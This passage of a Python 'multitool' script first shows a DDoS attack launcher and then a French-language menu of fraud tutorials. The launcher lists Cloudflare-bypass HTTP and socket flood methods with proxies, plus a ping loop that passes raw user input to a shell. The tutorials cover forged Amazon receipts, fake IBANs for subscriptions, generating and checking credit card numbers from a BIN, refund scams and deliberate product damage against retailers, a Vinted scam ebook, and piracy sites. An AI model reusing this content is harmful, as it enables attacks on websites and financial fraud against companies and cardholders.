          ______ _                       
          | ___ (_)                      
          | |_/ /_ _ __   __ _  ___ _ __ 
          |  __/| | '_ \ / _` |/ _ \ '__|
          | |   | | | | | (_| |  __/ |   
          \_|   |_|_| |_|\__, |\___|_|   
                          __/ |          
                         |___/           """)
          ipv = input("ipv4 or ipv6 : ")
          ip = input("Enter Ip: ")
          if ipv == ("ipv4"):
              while True:
                  os.system("ping -t -4 " + ip)
          elif ipv("ipv6"):
              while True:
                os.system("ping -t 4 " + ip)
          
      else:
          stdout.write(Fore.LIGHTRED_EX+" [!] "+Fore.WHITE+"Unknown command ! View The command Type [help]\n")  
  ##############################################################################################   

  def func():
      stdout.write(Fore.RED+" [\x1b[38;2;0;255;189mLAYER 7"+Fore.RED+"]\n")
      stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cfb        "+Fore.RED+": "+Fore.WHITE+"Bypass CF attack\n")
      stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxcfb      "+Fore.RED+": "+Fore.WHITE+"Bypass CF attack with proxy\n")
      stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cfpro      "+Fore.RED+": "+Fore.WHITE+"Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (request)\n")
      stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cfsoc      "+Fore.RED+": "+Fore.WHITE+"Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (socket)\n")
  #    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"sky        "+Fore.RED+": "+Fore.WHITE+"HTTPS Flood and bypass for CF NoSec, DDoS Guard Free and vShield\n")
  #    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"stellar    "+Fore.RED+": "+Fore.WHITE+"HTTPS Sky method without proxies\n")
      stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"raw        "+Fore.RED+": "+Fore.WHITE+"Request attack\n")
      stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"post       "+Fore.RED+": "+Fore.WHITE+"Post Request attack\n")
      stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"head       "+Fore.RED+": "+Fore.WHITE+"Head Request attack\n")
      stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"soc        "+Fore.RED+": "+Fore.WHITE+"Socket attack\n")
      stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxraw      "+Fore.RED+": "+Fore.WHITE+"Proxy Request attack\n")
      stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxsoc      "+Fore.RED+": "+Fore.WHITE+"Proxy Socket attack\n")

      #stdout.write(Fore.RED+" \n["+Fore.WHITE+"LAYER 4"+Fore.RED+"]\n")
      #stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"tcp        "+Fore.RED+": "+Fore.WHITE+"Strong TCP attack (not supported)\n")
      #stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"udp        "+Fore.RED+": "+Fore.WHITE+"Strong UDP attack (not supported)\n")

      stdout.write(Fore.RED+" \n[\x1b[38;2;0;255;189mTOOLS"+Fore.RED+"]\n")
      stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"dns        "+Fore.RED+": "+Fore.WHITE+"Classic DNS Lookup\n")
      stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"geoip      "+Fore.RED+": "+Fore.WHITE+"Geo IP Address Lookup\n")
      stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"subnet     "+Fore.RED+": "+Fore.WHITE+"Subnet IP Address Lookup\n")

      stdout.write(Fore.RED+" \n[\x1b[38;2;0;255;189mOTHER"+Fore.RED+"]\n")
      stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"clear/cls  "+Fore.RED+": "+Fore.WHITE+"Clear console\n")
      stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"exit       "+Fore.RED+": "+Fore.WHITE+"Bye..\n")
      stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"credit     "+Fore.RED+": "+Fore.WHITE+"Thanks for\n")

  if __name__ == '__main__':
      init(convert=True)
      if len(sys.argv) < 2:
          log = open('./resources/log.txt', 'r').read().split('\n')
          clear()
          title()
          while True:
              command()
      elif len(sys.argv) == 5:
          pass
      else:
          stdout.write("Method: cfb, pxcfb, cfreq, cfsoc, pxsky, sky, http2, pxhttp2, get, post, head, soc, pxraw, pxsoc\n")
          stdout.write(f"usage:~# python3 {sys.argv[0]} <method> <target> <thread> <time>\n")
          sys.exit()
      log = open('./resources/log.txt', 'r').read().split('\n')
      method = sys.argv[1].rstrip()
      target = sys.argv[2].rstrip()
      thread = sys.argv[3].rstrip()
      t      = sys.argv[4].rstrip()
      if method == "cfb":
          timer = threading.Thread(target=countdown, args=(t,))
          timer.start()
          LaunchCFB(target, thread, t)
          timer.join()
      elif method == "pxcfb":
          if get_proxies():
              timer = threading.Thread(target=countdown, args=(t,))
              timer.start()
              LaunchPXCFB(target, thread, t)
              timer.join()
      elif method == "get":
          timer = threading.Thread(target=countdown, args=(t,))
          timer.start()
          LaunchRAW(target, thread, t)
          timer.join()
      elif method == "post":
          timer = threading.Thread(target=countdown, args=(t,))
          timer.start()
          LaunchPOST(target, thread, t)
          timer.join()
      elif method == "head":
          timer = threading.Thread(target=countdown, args=(t,))
          timer.start()
          LaunchHEAD(target, thread, t)
          timer.join()
      elif method == "pxraw":
          if get_proxies():
              timer = threading.Thread(target=countdown, args=(t,))
              timer.start()
              LaunchPXRAW(target, thread, t)
              timer.join()
      elif method == "soc":
          timer = threading.Thread(target=countdown, args=(t,))
          timer.start()
          LaunchSOC(target, thread, t)
          timer.join()
      elif method == "pxsoc":
          if get_proxies():
              timer = threading.Thread(target=countdown, args=(t,))
              timer.start()
              LaunchPXSOC(target, thread, t)
              timer.join()
      elif method == "cfreq":
          stdout.write(Fore.CYAN+" [!] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
          if get_cookie(target):
              timer = threading.Thread(target=countdown, args=(t,))
              timer.start()
              LaunchCFPRO(target, thread, t)
              timer.join()
          else:
              stdout.write(Fore.CYAN+" [!] "+Fore.WHITE+"Failed to bypass cf\n")
      elif method == "cfsoc":
          stdout.write(Fore.CYAN+" [!] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
          if get_cookie(target):
              timer = threading.Thread(target=countdown, args=(t,))
              timer.start()
              LaunchCFSOC(target, thread, t)
              timer.join()
          else:
              stdout.write(Fore.CYAN+" [!] "+Fore.WHITE+"Failed to bypass cf\n")
      elif method == "http2":
          target, thread, t = get_info_l7()
          timer = threading.Thread(target=countdown, args=(t,))
          timer.start()
          LaunchHTTP2(target, thread, t)
          timer.join()
      elif method == "pxhttp2":
          if get_proxies():
              target, thread, t = get_info_l7()
              timer = threading.Thread(target=countdown, args=(t,))
              timer.start()
              LaunchPXHTTP2(target, thread, t)
              timer.join()
      elif method == "pxsky":
          if get_proxies():
              target, thread, t = get_info_l7()
              threading.Thread(target=attackSKY, args=(target, t, thread)).start()
              timer = threading.Thread(target=countdown, args=(t,))
              timer.start()
              timer.join()
      elif method == "sky":
          target, thread, t = get_info_l7()
          threading.Thread(target=attackSTELLAR, args=(target, t, thread)).start()
          timer = threading.Thread(target=countdown, args=(t,))
          timer.start()
          timer.join()
      else:
          stdout.write("No method found\n")
          main()        


def interfacetech():
  System.Clear

  WELCOME = ("\n         By !' ML$D#9999 | Halal#9999")
  banner = ("""
      .::.                   ( ((
     'H .-;-.-.-.-.-.-.-.-.-/| ((::::::::::::::::::::::::::::::::::::::::::::::.._
    (D ( ( ( ( ( ( ( ( ( ( ( |  ))   -====================================-      _.>
     `S `-;-`-`-`-`-`-`-`-`-\| ((::::::::::::::::::::::::::::::::::::::::::::::''
      `::'                    \ \(
                               ) ))
                              (_((
    """)

  print(Colorate.Horizontal(Colors.yellow_to_red, (banner), 1))
  print(Colorate.Horizontal(Colors.yellow_to_red, (WELCOME), 1))
  
  textee = ("1) Trottinettes\n2) Num-Surtaxé\n3) Anti-amende\n4) Corrige-devoir\n5) Jeux-steam\n6) Bot-tiktok\n7) Apple-music\n8) Deezer\n9) Nord-Vpn\n10) Numéro")
  textee2 = ("11) Crunchyroll\n12) Carrefour\n13) Scam-vinted\n14) Anti-screameur\n15) Spotify\n16) Nike\n17) Amazon\n18) Zalando\n19) Pronostique\n20) Cinema\n21) Kfc\n")
  textee3 = ("\n22) Vbucks\n23) F1-free\n24) Mcdo\n25) Nike-2\n26) Graphiste\n27) Film\n28) Robux\n29) Carte-cadeau\n30) Nintendo-switch\n")
  textee4 = ("\n31) Starbucks\n32) Google-play\n33) Intro-Outro\n34) Psn\n35) 4G Illimité\n36) J4j\n37) Uber-eat\n38) Netflix\n39) Full-method\n40) Tiktok\n41) Instagram\n42) Remboursement")
  print(textee)
  print(textee2)
  print("Say next for go to second page")
  reponse=input("> ")
  if reponse =="next":
    System.Clear
    print(textee3)
    print(textee4)

  
  reponse=input("> ")
  
  if reponse=="1":
    
    from os import system
    print("""Pour les trottinettes bird:
      1 Tu crée un nouveau compte bird
      2 tu doit avoir 1,50€ maximum sur ta carte
      3 faire un trajet de plus de 1,50€ une fois dépassé les 1,50 il ne pourront plus te prélever même les 1,50€ ne seront pas débité 
      NB : ça ne marche qu’une seule fois sur le même compte 


      Pour les trottinettes lime:
      1 Vous devez Téléchargez l'application à l'aide de ce lien : https://lime.bike/referral_signin/R4KKI5G)
      2 Il faut avoir Temp mail pour avoir des mails jetables pendant 3-4 minutes 
      3 Tu va sur Temp mail et tu génère un mail,tu copies 
      4 Tu vas dans l’app Lime, tu t’inscris avec le mail jetable et tu retourne sur le site pour confirmer le mail 
      5 Tu met un moyen de paiement (Big rat utilise paypal)
      6 Déverrouille une trottinette, on va te débiter 3€ temporairement ( 3 jours plus tard tu recevra les 3€)
      7 Le but est de crée plusieurs comptes avec l’application et de toujours profiter des 20 min


      Technique trottinettes Dott gratuites : 
      1: créer un compte principal et copier le code de parrainage dans « gagner des trajets gratuits » 
      2: créer un nouveau compte avec un 2e numéro (2Number ou TapCall, ou getfreesmsnumber.com ou oksms.org, tant que le numéro n’a jamais servi sur Dott)
      3: aller dans « promotions » et « ajouter un code » et rentrer le code de parrainage 664VVHF + « FREERIDE » et « AVELO »
      4: profitez de 2 trajets de 20 min + 1 trajet de 20 min + 2 trajets en vélo 20 min + 2 autres trajets sur le compte principal
      5: supprimer l’option de paiement après les 2 trajets et retourner sur le compte principal

      PS : payez avec Apple Pay idéalement, au cas où vous pensez pas à enlever le moyen de paiement""")
    input("")

  elif reponse=="2":
    

    from os import system

    print("""contourner num surtaxé
      Petit scénario

      Vous avez un problème avec votre compte bancaire. Vous vous dites "Pas de problèmes, un coup de fil à ma banque et ce sera réglé. Mais, ils vont me forcer à rester en communication pour me piquer mon forfait parce que leur numéro est 08 99 12 34 56. Je regarde mon forfait; il ne me reste que 15 minutes de communication, je n'aurais jamais assez sans recharge pour tenir la fin du mois".
      Rassurez-vous, vous pourrez tenir jusqu'a la fin du mois.

      Oui, je peux tenir jusqu'à la fin, mais comment

      Sachez qu'il existe des moteurs de recherche créés pour dénicher les numéros normaux des entreprises. Ces moteurs vous inviterons à entrer le numéro ou le nom de l'entreprise que vous voulez contacter, et ils vous donneront le numéro détaxé. Parmi ces sites, il y a :
      NonSurtaxe
      Detax
      Sanjb
      Cela peut être très utile a bientot pour de new tutoriel !""")
    input("")



  elif reponse=="3":
    from os import system

    print("""
      Alors en premier lieu vas falloir trouver un objet sur amazon que ta souvent sur toi, par exemple moi je choisit mon sac:

      https://www.amazon.fr/North-Face-Borealis-Classic-Noir/dp/B01DPK4IPO/instant-hack.to?sr_1_7?__mk_fr_FR=ÅMÅŽÕÑ&dchild=1&keywords=The+north+face+sac&qid=1582719300&sr=8-7

      Ensuite je fait un faux reçu amazon, je vais vous foutre la source pour le faire ici:


      https://anonfiles.com/t7jel2b1y8/facture-alim_pdf


      Du coup maintenant que vous avez ça il vous suffit d'ouvrir amazon.html et de l'éditer avec notepad++ et de changer toute les valeurs, comme le prix, l'adresse, le produit en question.


      Maintenant, mise en situation, vous vous faites contrôler vous leurs dites cash "J'ai pas mes papiers par contre" ils vont vous foutres en dehors du tram ou du bus et là vous leurs dites "Ah attendez j'ai probablement ma pièce d'identité en photo sur mon téléphone" vous faites genre de chercher et vous dites que vous l'avez pas mais que par contre vous avez un reçu avec votre nom-prénom et adresse dessus.

      Là du coup suffit de leurs montrer un screenshoot du faux reçu amazon avec dessus le faux nom-prénom que vous avez choisit (Foutez un truc qui correspond à votre gueule) et idem pour l'adresse, et comme vous êtes pas con c'est un reçu amazon pour un objet que vous avez déjà comme moi et mon sac du coup ça passe crème.
      """)
    input("")



  elif reponse=="4":
    
    from os import system

    print("""
      La technique est relativement simple :
      Il suffit de se rendre sur le site de l'éditeur du manuel (nous prendrons ici comme exemple Nathan)
      Se rendre dans l'espace ENSEIGNANT
      Inscrivez vous (mettez de la merde comme infos) :
      Ici ils vous demanderont un numéro (NUMEN) : 01E93
      Si ils vous demandent un numéro complet (rare) : 01E93 03656LFP
      Une fois l'inscription terminé, recherchez votre livre sur le site puis rendez vous dans "ACCES AU SITE COMPAGNON"
      Et la POUF, vos exercices corrigés.
      """)
    input("")



  elif reponse=="5":
    time.sleep(1)
    from os import system

    print("""
      Jeux gratuits steam ici :

      https://steamunlocked.net/
      """)
    input("")





  elif reponse=="6":
    time.sleep(1)
    from os import system
    print("""
    Vues, Partages, etc..
    1 : Installez la dernière version de python ici ( ULTRA IMPORTANT, AU DEBUT DU SETUP DE L'INSTALLATION DE PYTHON, CLIQUEZ BIEN SUR ADD TO PATH ) : https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe
    2 : installer le script tiktok ici : https://anonfiles.com/X6g189gdy5/Tiktok_Tarex_rar
    3 : Ajoutez chromedriver au path : Vous mettez le chromedriver.exe dans => C:\Windows
    4 : lancez le fichier installation.bat en premier ( Il faut le faire qu'une seule fois )
    5 : lancer start.bat
    6 : profitez
    7 : Mettez le captcha sur la page qui c'est ouverte, faites entrée, puis revenez sur la page CMD
    8 : choisissez votre option et profitez la famille.
    - Le bot va utiliser zefoy.com en automatique, zefoy c un site ou quand tu rentre ta vidéo bah t'as environ 2500 vues, tu peux le faire toutes les 2 minutes mais manuellement, là le bot va le faire automatiquement dès que il pourra, donc environ 30k vues par heures, sois 800,000 vues toutes les 24H, c'est énormé, et pour les partages c'est encore pire.
    """)
    input("")
  elif reponse=="7":
    time.sleep(1)
    from os import system
    print("""
    Technique Apple music:
    1. Télécharger l’application Shazam 
    2. Allez dans les offres et sélectionner l’essai de 3 mois
    3. Après 3 mois renier l’abonnement.
    """)
    input("")    
  elif reponse=="8":
    time.sleep(1)
    from os import system
    print("""
    Technique Deezer :
    - Crée toi un compte
    - Appuis sur "Essayer gratuitement"
    - Appuis sur "Prélèvement bancaire"
    - Mets des informations valides au hasard et à la fin ton adresse email
    - Vas sur randomiban.com et choisis "Austria"
    - Copie, colle l'IBAN donné ( il peut ne pas marcher la premiere fois, dans se cas la, re génère toi en un autre)
    - Met ton numéro et valide ton code
    Voila, tu as ton Deezer premium.""")
    input("")
  elif reponse=="9":
    time.sleep(1)
    from os import system
    print("""
    Méthode Nord VPN (2 ans)
    Étape 1 - Connectez-vous à la Suède via n'importe quel VPN
    Étape 2 - Accédez à https://nordvpn.com/
    Étape 3 - Faites défiler vers le bas et cliquez sur le plan de 3 ans
    Étape 4 - Pour le courrier électronique, utilisez Temp Mail
    Étape 5 - Sélectionnez "Prélèvement automatique" et sélectionnez l'Allemagne comme pays.
    Étape 6 - Obtenez toutes les informations de https://fake-it.ws/
    Étape 7 - Faites défiler et obtenez le numéro IBAN.
    Étape 8 - Après avoir tout rempli, cliquez sur Confirmer l'annonce, puis vous recevrez un e-mail.
    Étape 9 - Ouvrez l'e-mail et confirmez-le.
    Étape 10 - Définissez Pswd et connectez-vous à nordvpn.com.""")
    input("")
  elif reponse=="10":
    time.sleep(1)
    from os import system
    print("""
    1. Receive-sms-online.into
    2. Receivefreesms.net
    3. Sms-receive.net
    4.Receive-a-sms.com
    5.Hs3x.com
    6.Receive-sms-now.com - (There are
    Russian numbers)
    7.Smsreceivefree.com
    8. Receivesmsonline.com
    9. Getsms.org-(PyC.HOMepa)
    10. Tempsms.ru - (Rus.number)
    11. Numberforsms.com - (There are Russian
    numbers)
    12. Sonetel.com
    13. Smska.us-(Rus.number)
    14. Sellaite.com
    15. Sms.ink-(Rus.numera)
    16.Proovl.com
    17. Onlinesim.ru
    18. Zadarma.com - (There are Russian
    numbers)
    19. Smsc.ru - (You need to register, there are
    Russian and Ukrainian numbers)
    20.Freevirtualnumber.skycallbd.com
    21. Getfreesmsnumber.com
    22. Receive-smsonline.net - Yearly design
    23. Receivefreesms.com
    24. Receivesmsverification.com
    25 Sms-online.co
    26. Ireceivesmsonline.com
    27. Receive-sms-online.com - (There are a
    number of scores)
    28. Receive-sms-free.com
    29. Esendex.com.au - (Registration required)
    30. Receivesmsonline.in
    31. Mytrashmobile.com
    32. Receivesmsonline.me
    33. Anon-sms.com
    34. Mfreesms.com
    35. Spryng.nl - (You need to register)
    36. Smsreceiveonline.com
    37. Smsget.net - (Megaphone and Beeline)
    """)
    input("")
  elif reponse=="11":
    time.sleep(1)
    from os import system
    print("""
    - Crée un compte google et ne prennez pas vos anciens comptes
    - Connectez le compte que vous venez de crée dans votre play store et connectez le aussi dans le site g-pay - Une fois vers la fin allez sur le play store déconnecter vos comptes que vous avez connectez le compte que vous avez realisé avec la manip ! installez votre appli avec un essai et prenez le voila slight_smile
    - Pensez a partir de G-PAY de mettre "US" et pas "FR"
    pour cela il faudra suivre les étapes suivantes :
    Etape 1 : Crée une nouvelle adresse email fr
    Etape 2 : Connectez la new l'adresse email sur le site g-pay
    Google payments : https://pay.google.com/gp/w/u/0/home/paymentmethods?sctid=3349011462073413 ou https://myaccount.google.com/payments-and-subscriptions?gar=1
    Etape 3 : ajouté une méthode de payment
    Etape 4 : rentrer un cc valide
    Pour cela :
    prendre ce bin 489504 et le rentrer dans namso gen
    (https://namso-gen.com/)
    Etape 5 : Générer les cb en selectionnez 1 et la rentré sur g-pay ou copié tout les cb allez sur cc check les collés tous "cliqué sur start" dès qu une carte apparait en vert sa veux dire qu'elle est valide faut la prendre
    VERIFICATEUR DE CARTE : https://www.mrchecker.cc/card/ccn2/
    Etape 6 : Methode de payment : US
    Nom : kyles macc
    Etape 7 : Rentre les infos de la cb donné par le namso puis mettre une adresse postal us
    Etape 8 : sauvegarder si y'a error retesté une autre cb
    Et une fois fais ça avec 1 carte le tour est joué > vous connecté le compte sur votre play store > vous déconnecter les autres comptes que vous avez déjà de sur le play store (sauf celui que tu viens de crée avec la vidéo)*
    pui rendez vous sur l'appli désirée pour prendre l'essai gratuit.
    """)
    input("")
  elif reponse=="12":
    time.sleep(1)
    from os import system
    print("""
    https://i.imgur.com/1rHNABk.png
    """)
    input("")
  elif reponse=="13":
    time.sleep(1)
    from os import system
    print("""
    https://cdn.discordapp.com/attachments/1002600595561132193/1002600803623776387/EBook-Scam_Vinted.pdf
    """)
    input("")
  elif reponse=="14":
    time.sleep(1)
    from os import system
    print("""
    ça vous dit de pouvoir aller sur un lien mais sans jamais y aller? Et oui c'est possible, t'as peur qu'il y ai un screameur, un ip logger,
    ou autre chose? met le lien ici https://s1ck.pw/tools.php?Screenshot et t'aura un screenshot du site.
    """)
    input("")
  elif reponse=="15":
    time.sleep(1)
    from os import system
    print("""
    Bonjour,
    ICI QUELQUES METHODES SAFE POUR AVOIR SPOTIFY PREMIUM GRATUIT !! :
    https://www.spotify.com/fr/
    Sur ce lien, pour les nouveaux comptes, vous avez 3 mois gratuit de Spotify Premium PERSONNEL, après ces 3 mois écoulés, vous serez débité de 9,99e ; mais alors,
    comment éviter de payer après les 3 mois d'essai  ?
    Connectez-vous sur spotify.com/account.
    Sous Votre abonnement, cliquez sur MODIFIER L'ABONNEMENT.
    Faites défiler jusqu'à Annuler Spotify et cliquez sur ANNULER PREMIUM.
    ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    XBOX GAME PASS ULTIMATE 1 EURO POUR LE PREMIER MOIS
     ( pour les nouveaux utilisateurs ), dans les avantages du game pass ULTIMATE, vous aurez accès a 4 mois de Spotify Premium
    ( pensez bien à annuler l'abonnement pour ne rien payer ) 
    ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    DERNIERE METHODE, un petit .bat safe, que j'ai utilisé quelque mois, qui marche toujours très bien.
    juste télécharger et éxecuter, profitez bien de Spotify PREMIUM sans payer.
    MERCI D'AVOIR PRIS LE TEMPS DE LIRE. 
    """)
    input("")
  elif reponse=="16":
    time.sleep(1)
    from os import system
    print("""
    1) Pour la technique Nike rien de plus simple: 
    1- Acheter un article de votre choix, de préférence une paire de chaussure 
    2- Une fois le colis arriver, appelez le service client Nike (+33 (0) 170489073)
    3- Dans cette appel téléphonique avec le conseiller vous vous plaindrez que votre chaussure n’était pas présente dans la boîte à chaussure, c’est à dire qu’il n’y avait que la boîte et non la paire
    4- N’oubliez pas de faire part d’un bon jeu d’acteur en précisant que cela est la première que ça vous arrive et que vous trouvez ça inadmissible etc. 
    5- Vous vous faites rembourser, bien jouer à vous.
    2) https://cdn.discordapp.com/attachments/1002600595561132193/1002601036130824333/Nike_refund.pdf
    """)
    input("")
  elif reponse=="17":
    time.sleep(1)
    from os import system
    print("""
    https://cdn.discordapp.com/attachments/1002600595561132193/1002601036462166167/REFUND_AMAZON.pdf
    """)
    input("")
  elif reponse=="18":
    time.sleep(1)
    from os import system
    print("""
    https://cdn.discordapp.com/attachments/1002600595561132193/1002600981663592629/REFUND_ZALANDO.pdf
    """)
    input("")
  elif reponse=="19":
    time.sleep(1)
    from os import system
    print("""
    Technique pour faire des pronostics gratuitement
    Bonjours tout le monde, Je viens vous présenter une application
    Elle permet de faire un championnat de prono de matchs entre membre du groupe! 
    Si tu n’as pas l’application, télécharge au plus vite Scorecast, disponible sur l’APP store et le Play Store! 
    Et rejoint vite cette toute nouvelle compétition que je viens de créer à l’instant en suivant ce lien! 
    Elle appartient au serveur! 
    -Pronostique Coupe Du Monde 2022 (créé par moi même):
    https://app.scorecast.fr/join.php?instance_token=7cdb6c82
    -Pronostique Ligue 1 2022/2023 (en cours de réalisation): https://app.scorecast.fr/join.php?instance_token=3e220e34
    Pronostique Ligue 2 2022/2023 (Si je trouve): https://app.scorecast.fr/join.php?instance_token=6095aac2
    -Pronostique Europa League Conférence 2022/2023 (en cours de réalisation): https://app.scorecast.fr/join.php?instance_token=7748f619
    -Pronostique Europa League 2022/2023 (en cours de réalisation):  https://app.scorecast.fr/join.php?instance_token=27b2e0e8
    -Pronostique League des Champions (en cours de réalisation): https://app.scorecast.fr/join.php?instance_token=009883be
    """)
    input("")
  elif reponse=="20":
    time.sleep(1)
    from os import system
    print("""
    Technique cinéma illimité
    1- Se rendre sur le site : UGC (https://ugc.fr/)
    2- Cliquer sur le petit bonhomme en haut à droite
    3- Dessendre tout en bas du site jusqu'au offres de cartes
    4- Cliquer sur découvrir les offres
    5- Choisir l'offre à 36.80€ par mois
    6- Cliquer sur s'abonner à l'offre
    7- Entrer ses coordonnées
    8- Cocher la case "Le payeur est différent de l'abonné"
    9- Utiliser "Noël Leveque" comme nom et prénom
    10- Se rendre sur le site : Fake IT (https://fake-it.ws/)
    11- Sélectionner la langue français (flag_fr)
    12- Faire défiler le site
    13- Recopier les informations d'adresse (pays, ville, adresse, code postal....) afficher sur site (FAKE IT) sur le site UGC
    14- Inséré une photo de vous
    15- À la question "êtes vous parainé" cochez "Non"
    16- Cochez ensuite la dernières case seulement
    17- Acceptez et entrez votre adresse de livraison
    18- Cliquez sur payement et mettez ces informations de payement :
    TITULAIRE DU COMPTE : Noël Leveque
    IBAN : FR7620041010058913699459076
    BIC : PSSTFRPPLIL
    19- Vérifiez votre adresse email
    Et voilà vous pouvez allez au cinéma gratuitement à l'illimité!
    """)
    input("")
  elif reponse=="21":
    time.sleep(1)
    from os import system
    print("""
    Technique KFC
    Vous voulez aller à la page d’accueil de KFC, et trouver l’option de nous contacter. Mettez des informations RÉELLES car c’est là qu’ils enverront un bon. Pour la marque de magasin "Je ne me souviens pas" ou choisissez un endroit aléatoire (environ 5 + miles de vous), puis voici la partie la plus importante décrivant / donner des commentaires.
    Je suis allé le long des lignes de "Bonjour, je suis récemment revenu d’un voyage en voiture et sur le chemin de ma maison, je me suis arrêté pour obtenir un peu de KFC. J’ai acheté (article ici) et il a goûté horrible, une boîte a goûté vieux tandis que l’autre n’a pas goûté entièrement cuit. Nous avons fini par avoir des côtés et d’autres articles, mais les jeter tous à cause du goût horrible que nous avions obtenu du poulet. Je suis vraiment déçu parce que KFC était mon endroit préféré pour manger. "
    S’il vous plaît trouver une façon différente de le commander, Je n’ai pas inclus l’élément que j’ai dit dans le post ci-dessus afin que les gens ne peuvent pas exactement copier les mots que j’ai dit, Juste être créatif. Ils répondront dans la même journée (normalement)
    Ma réponse d’eux:
    « Cher _ : Merci de partager votre expérience avec nous. Chez KFC, nous apprécions nos invités et sommes fiers de vous offrir un poulet délicieux, des côtés exceptionnels et un service. Veuillez accepter nos plus sincères excuses pour ne pas avoir répondu à vos attentes. Nous devons savoir quand nous n’avons pas honoré cet engagement pour vous. Vos commentaires nous donnent l’occasion de nous améliorer dans ces domaines. Pour vous remercier de nous avoir fait part de vos commentaires et de nous avoir fourni votre adresse, vous recevrez un bon spécial pour les invités au cours des 7 à 10 prochains jours. Nous nous réjouissons de vous servir à nouveau bientôt.Chez KFC, nous nous efforçons de répondre à vos attentes.
    """)
    input("")
  elif reponse=="22":
    time.sleep(1)
    from os import system
    print("""
    Technique Vbucks
    Pour commencer, il faut acheter une ou plusieurs cartes cadeaux sur  https://www.seagm.com/fr/xbox-live-gift-cards-brazil  selon ce qui est nécessaire ensuite pour acheter les vbucks.
    Les prix des vbucks sont ici :  https://www.microsoft.com/pt-br/p/fortnite-1000-v-bucks/c0f5ht9nv86p?activetab=pivot:overviewtab  (descendre en bas pour retrouver les prix des vbucks et packs )
    Lorsque l'on a reçu la carte cadeaux, on paie les vbucks chez microsoft grâce aux cartes cadeaux que l'on a acheté auparavant.
    Pour ensuite activer les vbucks, il faut se connecter sur xbox pour pouvoir accéder aux vbucks. Ensuite les vbucks seront utilisables sur pc, mobile et xbox ! 
    """)
    input("")
  elif reponse=="23":
    time.sleep(1)
    from os import system
    print("""
    f1 Technique Formule 1
    1) Installez un vpn
    2) Connectez-vous en Belgique
    3) Rendez-vous sur https://www.rtbf.be/auvio/
    4) Profitez de la formule 1 avec le commentateur de F1TV gratuitement !
    """)
    input("")
  elif reponse=="24":
    time.sleep(1)
    from os import system
    print("""
    Technique McDo
    - Télécharger l'appli McDo
    - Faire sa commande
    - Payer avec PayPal (important, si vous n'avez pas de compte mais que vous avez une carte
    bancaire, créez un compte PayPal et liez votre carte bancaire au compte PayPal) - Aller sur la borne du McDo, se connecter, vous écrivez ou scannez votre code (Le code
    barre de votre compte McDo+). Vous prenez commande Internet et vous validez votre commande. - Un ticket va s'imprimer vous attendez et bref vous mangez Une fois fait, vous allez sur votre
    transaction sur PayPal, vous mettez:
    - Signaler un problème -> J'ai reçu un objet ne correspondant pas à sa description
    - Vous cochez produit
    - Vous cochez Endommagé, Différent et Pièces Manquantes - Dans la description vous écrivez du mytho, genre y'avait pas la tomate, c'était infâme et
    périmé, inadmissible.... McDo ont 10 jours pour répondre
    Spoiler alert: Ils ne répondent pas, car ils n'ont pas de SAV dédié pour PayPal. Ce qui veut dire que quoi que vous écriviez, vous gagnez systématiquement le litige et donc au bout des 10 jours, vous avez votre commande remboursée (Si c'est sur une carte bancaire cela peut prendre 11-12 jours, le temps que l'argent arrive sur la carte I) 
    """)
    input("")
  elif reponse=="25":
    time.sleep(1)
    from os import system
    print("""
    Technique Nike
    1. Rendez-vous dans un magasin Nike ou Nike Outlet.
    2. Trouvez une CHAUSSURE dont le prix est très fortement réduit, par exemple une chaussure de 250€ réduite à 100€.
    3. Une fois que vous avez trouvé une telle chaussure, achetez-la. Je vous recommande vivement d'acheter une chaussure avec Nike Air. 
    Ou quelque chose comme des Vapor Maxes, Airmaxes, & etc.  PAS UNE CHAUSSURE COMME LES ROSHES OU LES VAPORFLYS
    4. Une fois que vous avez acheté cette chaussure, commencez à la porter pendant quelques jours à l'extérieur jusqu'à ce qu'elle ait l'air décemment utilisée.
    5.  Après quelques utilisations, tenez un briquet sur la bulle d'air jusqu'à ce qu'elle éclate ou tranchez la bulle d'air. Assurez-vous que cela ressemble à un accident et non à un acte délibéré.
    6. Une fois que tout cela a été fait, allez sur : https://help-us.nikeinc.com/app/eclaim_agree_terms/country_abrev/us/rma_type/Rm9vdHdlYXI=/
    7. Remplissez toutes vos informations et dans la section "Raison du retour", indiquez quelque chose comme "Je suis un fidèle de Nike depuis des années... bla bla bla... ces chaussures ont éclaté après 5 utilisations et je suis extrêmement déçu. Je ne peux plus porter ces chaussures en raison du manque de soutien dû à la bulle d'air éclatée. J'attends avec impatience votre réponse" Ne le copiez pas exactement ou NIKE commencera à le rattraper, modifiez-le et rendez-le crédible. 
    """)
    input("")
  elif reponse=="26":
    time.sleep(1)
    from os import system
    print("""
    site graphiste
    https://auto.creavite.co/
    """)
    input("")
  elif reponse=="27":
    time.sleep(1)
    from os import system
    print("""
    Technique Film
    1) Allez sur ce site https://vaxflix.vaxall.repl.co/
    2) Choisissez et regardez le film que vous voulait
    3) Tu peux regarder ton film gratuitement.
    """)
    input("")
  elif reponse=="28":
    time.sleep(1)
    from os import system
    print("""
    Générateur de Carte robux
    https://replit.com/@BDFDTUTORIAL/robux-gen-1?v=1
    """)
    input("")
  elif reponse=="29":
